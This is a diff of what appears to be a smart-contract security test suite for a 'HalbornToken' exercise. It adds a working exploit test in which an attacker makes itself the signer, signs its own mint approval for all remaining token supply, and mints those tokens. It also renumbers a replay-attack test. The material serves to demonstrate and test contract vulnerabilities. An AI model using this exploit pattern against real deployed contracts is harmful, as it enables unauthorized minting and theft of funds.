@@ -83,7 +83,33 @@ describe('[HalbornToken] Exploits', function() {
 		).to.be.equal(attackerFunds);
 	});
 
-	it('[Exploit #2] \'mintTokensWithSignature\' is vulnerable to replay attacks', async function() {
+	it('[Exploit #2] Logic bug enables anyone to become the new \'signer\'', async function(){
+		let signedAmount = ethers.constants.MaxUint256.sub(await this.token.totalSupply());
+
+		// Message that will be signed by the attacker
+		let msgHash = ethers.utils.solidityKeccak256(['bytes32', 'uint256', 'bytes32'], [
+			"0x" + "00".repeat(12) + this.token.address.slice(2), // Pad the address as the signature recovery expects standard encoded values (abi.encode)
+			signedAmount, 
+			"0x" + "00".repeat(12) + attacker.address.slice(2)
+		]);
+		// Attacker sign his/her own message approving him/her for minting all remaining tokens
+		let signedMsg = await attacker.signMessage(ethers.utils.arrayify(msgHash));
+
+		const r = signedMsg.slice(0, 66);
+		const s = '0x' + signedMsg.slice(66, 130);
+		const v = '0x' + signedMsg.slice(130, 132);
+
+		await expect(
+			this.attackerInstance.setSigner(attacker.address)
+		).to.not.be.reverted;
+		await this.attackerInstance.mintTokensWithSignature(signedAmount, r, s, v);
+
+		expect(
+			await this.token.balanceOf(attacker.address)
+		).to.be.equal(signedAmount);
+	});
+
+	it('[Exploit #3] \'mintTokensWithSignature\' is vulnerable to replay attacks', async function() {
 		let alice = employees[0];
 		let signedAmount = ethers.utils.parseEther('100');
 
